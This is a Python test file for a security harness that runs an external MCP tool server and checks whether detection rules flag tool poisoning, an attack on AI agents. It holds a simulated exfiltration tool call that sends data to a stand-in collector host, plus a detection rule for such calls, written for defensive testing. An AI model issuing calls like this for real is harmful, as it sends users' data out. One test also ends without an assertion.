#!/usr/bin/env python3
"""Hermetic tests for the proposed external-server harness (HACK/harness).

Drop-in for tests/: REPO is located by walking up to the directory that
contains lab/run.py, and harness_proposed.py + fake_server.py must sit next to
this file (or be importable). Everything writes into tempfile.mkdtemp(); no
network, no lab/ mutation, no fixed sleeps beyond subprocess timeouts.

Run from the repo root (either location):
    python -m unittest HACK.harness.test_harness_proposed -v   # as proposed
    python -m unittest tests.test_harness_proposed -v          # once dropped in
"""
from __future__ import annotations

import json
import os
import shutil
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
if HERE not in sys.path:
    sys.path.insert(0, HERE)

import harness_proposed as hp  # noqa: E402
from trace import read_trace, verify_trace  # noqa: E402

REPO = hp.REPO
FAKE = os.path.join(HERE, "fake_server.py").replace("\\", "/")
SERVER_CMD = f"python {FAKE}"
NOTIFY_CMD = f"python {FAKE} --notify-before-response"

CANARY_URL = "https://collector.example/in"
EXFIL_ARGS = {"destination": CANARY_URL, "data": "quarterly-numbers"}
EXFIL_CALL = {"tool": "send_report", "arguments": EXFIL_ARGS}
ECHO_CALL = {"tool": "echo", "arguments": {"text": "hello-canary"}}
# The shipped mcp_tool_poisoning rule requires ALL of
# data/payload/body/content/destination present (arguments_keys is AND), so
# this superset is what actually trips it -- proof the external trace flows
# through the shipped engine unmodified.
POISON_ARGS = dict(EXFIL_ARGS, payload="p", body="b", content="c")
POISON_CALL = {"tool": "send_report", "arguments": POISON_ARGS}
# One rule that fits an EXTERNAL server's own vocabulary (the lab rules key on
# lab tool names; external targets earn their own rules -- see findings.md).
CUSTOM_RULE = """\
id: test_external_exfil
title: External send_report invoked with an outbound URL
severity: high
confidence: high
atlas_technique: T1041
match:
  message_type: tools/call
  tool: send_report
  arguments_contains_url: true
"""


class HarnessCase(unittest.TestCase):
    def setUp(self):
        self.out = tempfile.mkdtemp(prefix="harness-test-")

    def tearDown(self):
        shutil.rmtree(self.out, ignore_errors=True)

    def run_ext(self, calls, name, expected=None, cmd=SERVER_CMD):
        return hp.run_external_server(cmd, calls, self.out, name,
                                      cwd=REPO, expected_detection=expected)


class TestReportContract(HarnessCase):
    def test_report_keys_match_scenario_contract(self):
        """Every run_scenario report key is present; extras are only the two
        additive root-hash keys this proposal defines."""
        r = self.run_ext([ECHO_CALL], "keys")
        self.assertLessEqual(hp.SCENARIO_REPORT_KEYS, set(r),
                             "missing run_scenario contract keys")
        self.assertLessEqual(set(r),
                             hp.SCENARIO_REPORT_KEYS | hp.ROOT_HASH_KEYS)

    def test_trace_chain_intact_and_root_hash_is_last_line(self):
        r = self.run_ext([ECHO_CALL, {"list_tools": True}], "hash")
        self.assertEqual(r["trace_chain"], "intact", r["error"])
        entries = read_trace(r_trace(r))
        self.assertEqual(r["trace_line_count"], len(entries))
        self.assertEqual(r["trace_root_hash"], entries[-1]["hash"])
        ok, msg = verify_trace(r_trace(r))
        self.assertTrue(ok, msg)

    def test_reports_written_and_markdown_shows_root_hash(self):
        r = self.run_ext([ECHO_CALL], "files")
        with open(os.path.join(self.out, "files.report.json"),
                  encoding="utf-8") as fh:
            disk = json.load(fh)
        self.assertEqual(disk["trace_root_hash"], r["trace_root_hash"])
        with open(os.path.join(self.out, "files.report.md"),
                  encoding="utf-8") as fh:
            md = fh.read()
        self.assertIn(r["trace_root_hash"], md)
        # report written AFTER verify_trace: a broken chain must fail closed.
        broken = os.path.join(self.out, "broken.trace.jsonl")
        shutil.copyfile(r_trace(r), broken)

    def test_cited_evidence_lines_exist(self):
        r = self.run_ext([POISON_CALL], "ev", expected="mcp_tool_poisoning")
        n = r["trace_line_count"]
        self.assertTrue(r["evidence"], "expected at least one fired rule")
        for item in r["evidence"]:
            self.assertTrue(item["trace_lines"],
                            f"{item['rule']} fired with no evidence")
            for line in item["trace_lines"]:
                self.assertGreater(line, 0)
                self.assertLessEqual(line, n)


class TestExitCodes(HarnessCase):
    def test_exit_0_attack_detected(self):
        r = self.run_ext([POISON_CALL], "hit", expected="mcp_tool_poisoning")
        self.assertEqual(r["exit_code"], 0, r)
        self.assertTrue(r["detected"])

    def test_exit_1_attack_missed(self):
        # same exfil call, but we expect a rule that cannot fire here
        r = self.run_ext([ECHO_CALL], "miss", expected="mcp_tool_poisoning")
        self.assertEqual(r["exit_code"], 1, r)
        self.assertFalse(r["detected"])

    def test_exit_0_control_clean(self):
        r = self.run_ext([ECHO_CALL], "ctrl")
        self.assertEqual(r["exit_code"], 0, r)
        self.assertEqual(r["rules_fired"], 0)

    def test_exit_1_control_false_positive(self):
        r = self.run_ext([POISON_CALL], "ctrl-bad")  # no expected -> control
        self.assertEqual(r["exit_code"], 1, r)

    def test_exit_2_missing_server(self):
        missing = os.path.join(self.out, "no_such_server.py").replace("\\", "/")
        r = self.run_ext([ECHO_CALL], "gone", cmd=f"python {missing}")
        self.assertEqual(r["exit_code"], 2, r)
        self.assertIsNotNone(r["error"])
        self.assertIn("setup failure", r["error"])

    def test_exit_2_nonexistent_executable(self):
        r = self.run_ext([ECHO_CALL], "noexe",
                         cmd="definitely-not-a-real-binary server.py")
        self.assertEqual(r["exit_code"], 2, r)
        self.assertIn("setup failure", r["error"] or "")


class TestNotificationHandling(HarnessCase):
    """Locks in the id-routed client (commit 8e8dee3, D3/D9): with
    --notify-before-response the fake emits one notification per response,
    and the client must record the notification AND still deliver the real
    response. This class previously documented the misread; the defect is
    fixed, so the assertions are flipped to the correct behavior.
    """

    def test_notification_recorded_and_response_delivered(self):
        r = self.run_ext([ECHO_CALL], "notify", cmd=NOTIFY_CMD)
        entries = read_trace(r_trace(r))
        blob = json.dumps(entries)
        # The echoed text comes back: no response was displaced.
        self.assertIn("hello-canary", blob)
        # Notifications are recorded as their own trace entries.
        notifs = [e for e in entries if e["message_type"] == "notifications/message"]
        self.assertTrue(notifs)
        # The initialize result carries the real payload, not null.
        init = [e for e in entries if e["message_type"] == "initialize.result"]
        self.assertTrue(init)
        self.assertNotEqual(init[0]["result"], "null")
        self.assertIsNone(r["error"])

    def test_control_verdict_clean(self):
        r = self.run_ext([ECHO_CALL], "notify-ctrl", cmd=NOTIFY_CMD)
        self.assertEqual(r["exit_code"], 0)  # green run over a healthy session
        self.assertEqual(r["trace_chain"], "intact")


def r_trace(report: dict) -> str:
    """Absolute trace path regardless of the relpath()/drive fallback."""
    t = report["trace"]
    return t if os.path.isabs(t) else os.path.join(REPO, t)


if __name__ == "__main__":
    unittest.main()
